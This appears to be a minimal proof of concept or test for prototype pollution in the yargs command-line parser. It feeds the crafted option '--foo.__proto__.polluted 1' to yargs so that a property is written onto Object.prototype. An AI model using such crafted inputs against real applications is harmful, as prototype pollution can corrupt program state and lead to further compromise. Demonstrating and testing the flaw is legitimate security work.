const yargs = require("yargs");
yargs("--foo.__proto__.polluted 1").count("foo.__proto__.polluted").argv;
